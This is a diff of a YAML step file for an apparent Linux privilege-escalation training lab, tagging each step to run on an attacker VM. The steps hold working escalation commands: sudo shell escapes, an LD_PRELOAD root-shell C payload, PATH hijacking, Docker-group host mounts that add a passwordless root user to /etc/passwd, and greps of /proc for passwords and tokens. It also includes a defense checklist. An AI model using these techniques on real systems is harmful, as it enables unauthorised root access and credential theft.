@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: uid=
     field: stdout
+  target_vm: attacker
   script: id && whoami && groups && sudo -l 2>&1 | head -20
   risk_level: low
 - order: 2
@@ -37,6 +38,7 @@ steps:
     type: output_contains
     expect: /usr/
     field: stdout
+  target_vm: attacker
   script: find / -perm -4000 -type f 2>/dev/null | head -20
   risk_level: low
 - order: 3
@@ -52,6 +54,7 @@ steps:
     type: output_contains
     expect: Linux
     field: stdout
+  target_vm: attacker
   script: 'uname -a && cat /proc/version && echo ''---'' && echo ''Known kernel LPE vulnerabilities:'' && echo ''CVE-2016-5195 DirtyCow: Linux < 4.8.3'' && echo ''CVE-2022-0847 DirtyPipe: Linux 5.8 - 5.16.11''
     && echo ''CVE-2021-4034 PwnKit: polkit pkexec (any version)'' && echo ''CVE-2023-0386 OverlayFS: Linux < 6.2'''
   risk_level: low
@@ -68,6 +71,7 @@ steps:
     type: output_contains
     expect: Sudo Shell Escape
     field: stdout
+  target_vm: attacker
   script: echo '=== Sudo Shell Escape Techniques ===' && echo '' && echo '[vim] sudo vim -c ":!bash"' && echo '[less] sudo less /etc/hosts -> !bash' && echo '[find] sudo find / -name x -exec /bin/bash \;'
     && echo '[nmap] sudo nmap --interactive -> !sh' && echo '[python] sudo python3 -c "import os;os.system("/bin/bash")"' && echo '[awk] sudo awk "BEGIN {system("/bin/bash")}"' && echo '[env] sudo env /bin/bash'
     && echo '[man] sudo man man -> !bash' && echo '' && echo 'Current sudo permissions:' && sudo -l 2>&1 | tail -10
@@ -84,6 +88,7 @@ steps:
     type: output_contains
     expect: Cron
     field: stdout
+  target_vm: attacker
   script: echo '=== Cron Jobs ===' && cat /etc/crontab 2>/dev/null && echo '---' && ls -la /etc/cron.d/ 2>/dev/null && echo '---' && ls -la /etc/cron.daily/ 2>/dev/null | head -10 && echo '---' && echo
     'World-writable scripts referenced by cron:' && find /etc/cron* -type f -exec grep -l '/' {} \; 2>/dev/null | head -5
   risk_level: low
@@ -99,6 +104,7 @@ steps:
     type: output_contains
     expect: cap_
     field: stdout
+  target_vm: attacker
   script: getcap -r / 2>/dev/null | head -20 && echo '---' && echo 'Dangerous capabilities:' && echo 'cap_setuid -> Change UID to root' && echo 'cap_dac_override -> Bypass file permission checks' && echo
     'cap_sys_admin -> Mount filesystems, debug processes' && echo 'cap_net_raw -> Raw socket access (packet sniffing)'
   risk_level: low
@@ -115,6 +121,7 @@ steps:
     type: output_contains
     expect: writable
     field: stdout
+  target_vm: attacker
   script: find /etc -writable -type f 2>/dev/null | head -10 && echo '---' && find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -10 && echo '---' && echo 'Writable /etc/passwd ->
     add root user' && echo 'Writable /etc/shadow -> replace root hash' && echo 'Writable /etc/sudoers -> grant sudo access'
   risk_level: low
@@ -131,6 +138,7 @@ steps:
     type: output_contains
     expect: LD_PRELOAD
     field: stdout
+  target_vm: attacker
   script: "cat > /tmp/preload.c << 'CEOF'\n#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\n\nvoid _init() {\n    unsetenv(\"LD_PRELOAD\");\n    setresuid(0, 0, 0);\n    system(\"/bin/bash\
     \ -p\");\n}\nCEOF\ncat /tmp/preload.c && echo '' && echo '=== Compile & Exploit ===' && echo 'gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c' && echo 'sudo LD_PRELOAD=/tmp/preload.so\
     \ <allowed_command>' && echo '' && echo 'Requires: sudo with env_keep+=LD_PRELOAD or NOPASSWD command'"
@@ -147,6 +155,7 @@ steps:
     type: output_contains
     expect: PATH Hijacking
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== PATH Hijacking ==='' && echo ''#!/bin/bash'' > /tmp/ps && echo ''id && whoami'' >> /tmp/ps && chmod +x /tmp/ps && echo ''Created fake "ps" at /tmp/ps:'' && cat /tmp/ps && echo ''''
     && echo ''If SUID binary calls: system("ps") without full path'' && echo ''Exploit: export PATH=/tmp:$PATH && run_suid_binary'' && echo ''Result: /tmp/ps (attacker script) executed as root'' && rm /tmp/ps'
   risk_level: medium
@@ -163,6 +172,7 @@ steps:
     type: output_contains
     expect: Docker Group
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Docker Group Privilege Escalation ==='' && echo ''docker run -v /:/hostfs -it alpine chroot /hostfs /bin/bash'' && echo '''' && echo ''Alternative methods:'' && echo ''1. Mount /etc/shadow:
     docker run -v /etc/shadow:/shadow alpine cat /shadow'' && echo ''2. Add SUID bash: docker run -v /:/mnt alpine chmod u+s /mnt/bin/bash'' && echo ''3. Modify /etc/passwd: docker run -v /etc:/etc alpine
     sh -c "echo root2::0:0::/root:/bin/bash >> /etc/passwd"'' && echo '''' && groups 2>&1'
@@ -181,6 +191,7 @@ steps:
     type: output_contains
     expect: /proc
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== /proc Sensitive Data ==='' && for pid in $(ls /proc/ | grep -E ''^[0-9]+$'' | head -20); do cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr ''\0'' '' ''); [ -n "$cmdline" ] && echo
     "PID $pid: $cmdline"; done 2>/dev/null | grep -iE ''(pass|key|token|secret)'' | head -10; echo ''---'' && cat /proc/self/environ 2>/dev/null | tr ''\0'' ''\n'' | grep -iE ''(pass|key|token|api)'' |
     head -5; echo ''Done'''
@@ -199,6 +210,7 @@ steps:
     type: output_contains
     expect: NFS no_root_squash
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== NFS no_root_squash Exploitation ==='' && cat /etc/exports 2>/dev/null || echo ''No NFS exports found'' && echo '''' && echo ''[Concept]'' && echo ''no_root_squash: Remote root = Local
     root on NFS share'' && echo '''' && echo ''[Attack Steps]'' && echo ''1. showmount -e 10.20.30.x (find NFS exports)'' && echo ''2. mount -t nfs target:/share /mnt'' && echo ''3. cp /bin/bash /mnt/bash
     && chmod u+s /mnt/bash'' && echo ''4. On target: /share/bash -p -> root shell'' && echo '''' && echo ''[Defense]'' && echo ''- Use root_squash (default, maps root to nobody)'' && echo ''- Restrict NFS
@@ -217,6 +229,7 @@ steps:
     type: output_contains
     expect: Manual Privilege Escalation
     field: stdout
+  target_vm: attacker
   script: echo '=== Manual Privilege Escalation Enumeration ===' && echo '[Kernel]' && uname -r && echo '[SUID]' && find / -perm -4000 -type f 2>/dev/null | wc -l && echo 'SUID binaries found' && echo '[Sudo]'
     && sudo -l 2>&1 | tail -3 && echo '[Cron]' && ls /etc/cron.d/ 2>/dev/null | wc -l && echo 'cron.d entries' && echo '[Capabilities]' && getcap -r /usr/bin/ 2>/dev/null | head -5 && echo '[Writable /etc]'
     && find /etc -writable -type f 2>/dev/null | wc -l && echo 'writable files in /etc' && echo '[Docker]' && groups | grep -o docker || echo 'not in docker group'
@@ -278,6 +291,7 @@ steps:
     type: output_contains
     expect: Multi-Stage Privilege Escalation
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/privesc_chain.txt << ''EOF''
 
     === Multi-Stage Privilege Escalation Chain ===
@@ -374,6 +388,7 @@ steps:
     type: output_contains
     expect: Defense Checklist
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/hardening_checklist.txt << ''EOF''
 
     === Linux Privilege Escalation Defense Checklist ===
